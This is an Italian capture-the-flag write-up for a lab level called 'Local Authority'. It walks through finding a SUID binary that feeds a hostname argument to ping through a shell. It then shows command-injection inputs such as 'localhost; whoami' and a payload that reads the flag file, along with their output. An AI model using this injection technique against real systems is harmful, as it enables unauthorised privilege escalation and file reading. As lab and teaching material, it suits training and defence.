```
 ========================================================================
   B R E A C H L A B   ::   F I E L D   N O T E S
 ------------------------------------------------------------------------
   phantom track · phile 0x07 · "local authority"
 ========================================================================

   target ..: phantom-07  "Local Authority"
   class ...: privesc / SUID · OS command injection
   tools ...: find · ping · un po' di ; malizia
   author ..: noflyfre
   status ..: owned
```

[← indice](../../README.md)

> un'utility di sistema custom gira con privilegi elevati. sembra
> innocua: prende un hostname e lo controlla. la domanda giusta non è
> "funziona?", è "e se quello che gli passo non è un hostname?".

## ----[ 0x00 · intel ]----

Dal briefing del livello:

```text
MISSION: Local Authority
========================

A custom system utility runs with elevated privileges. It looks
safe. It takes a hostname argument and checks it.

Examine how it processes your input. What if the input is not a
hostname?

FLAG: owned by the user the SUID binary runs as (check `ls -l`
on the binary — it is not root).
```

Tradotto: c'è un binario SUID che accetta un hostname. Bisogna capire
come lo mastica dentro e se si può convincerlo a eseguire comandi
arbitrari con i suoi privilegi.

## ----[ 0x01 · recon ]----

Prima cosa, censimento dei binari SUID sul sistema:

```bash
find / -perm -4000 -exec ls -al {} \; 2>/dev/null
```

Filtrando per il proprio livello salta fuori il candidato:

```bash
find / -perm -4000 -exec ls -al {} \; 2>/dev/null | grep phantom7
-rwsr-x--- 1 flagkeeper7 phantom7 16224 May 28 16:07 /usr/local/bin/system-checker
```

`system-checker` è SUID, di proprietà `flagkeeper7`, eseguibile dal
gruppo `phantom7`. Non è root — e infatti la flag appartiene proprio a
`flagkeeper7`. Lo si interroga:

```bash
/usr/local/bin/system-checker --help
[*] Checking host: --help
[-] Host is unreachable.
```

Non riconosce `--help` come opzione: tratta qualunque argomento come un
hostname da pingare. Con un host valido:

```bash
/usr/local/bin/system-checker localhost
[*] Checking host: localhost
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.017 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
[+] Host is reachable.
```

L'output grezzo di `ping` è la confessione: dentro il binario c'è un
comando di sistema costruito con il nostro input.

## ----[ 0x02 · il difetto ]----

Se l'output di `ping` esce così com'è, l'argomento sta finendo in una
`system()` / `popen()` — quasi certamente una stringa tipo
`ping -c 1 <input>` passata a una shell. Nessuna whitelist di caratteri,
nessun escaping dei metacaratteri: basta un separatore come `;` per
attaccare un secondo comando, che eredita l'EUID del processo — cioè
`flagkeeper7`, il proprietario SUID, non chi lancia il binario.

Classica **OS command injection** dentro un wrapper SUID.

## ----[ 0x03 · exploit ]----

Prova del nove con un `;` e un `whoami`:

```bash
/usr/local/bin/system-checker 'localhost; whoami'
[*] Checking host: localhost; whoami
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.015 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
flagkeeper7
[+] Host is reachable.
```

`ping` gira su `localhost`, e subito dopo `whoami` stampa `flagkeeper7`.
Injection confermata, e con essa il salto di privilegi. A quel punto si
sostituisce il payload con la lettura diretta della flag:

```bash
/usr/local/bin/system-checker 'localhost; cat /var/lib/phantom-flags/level7_flag'
[*] Checking host: localhost; cat /var/lib/phantom-flags/level7_flag
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.019 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.019/0.019/0.019/0.000 ms
<REDACTED_FLAG>
[+] Host is reachable.
```

## ----[ 0x04 · loot ]----

Iniettando `; cat /var/lib/phantom-flags/level7_flag` nell'argomento
hostname, il comando gira con i privilegi di `flagkeeper7` e la flag
esce insieme all'output di `ping`. Il valore letterale resta fuori: la
lezione è che qualunque wrapper SUID che concatena input in una shell è
un privesc che aspetta solo un `;`.

```
--[ eof ]---------------------------------------------------------------

  breachlab.org · phantom track
```
